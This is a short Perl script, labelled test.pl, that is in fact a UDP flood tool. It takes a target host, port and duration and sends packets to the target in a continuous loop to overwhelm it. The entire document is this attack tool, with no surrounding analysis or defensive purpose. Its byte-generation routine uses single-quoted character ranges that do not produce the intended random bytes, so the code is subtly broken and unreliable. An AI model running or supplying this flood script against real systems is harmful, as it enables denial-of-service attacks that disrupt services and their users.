use Socket;
use strict;
use warnings;

if (@ARGV != 3) {
    die "Usage: test.pl <host> <port> <time>\n";
}

my ($ip, $port, $time) = @ARGV;
my $iaddr = inet_aton($ip) or die "Unable to resolve $ip\n";
my $endtime = time() + $time;

socket(my $flood, PF_INET, SOCK_DGRAM, 17);

sub random_hex {
    my @chars = ('\x00'..'\xff', '\xe0'..'\xe00f');
    return $chars[int(rand(@chars))];
}

while (time() <= $endtime) {
    my $hexed = join('', map { random_hex() } 1..64);
    send($flood, $hexed, 0, pack_sockaddr_in($port, $iaddr));
}

close($flood);
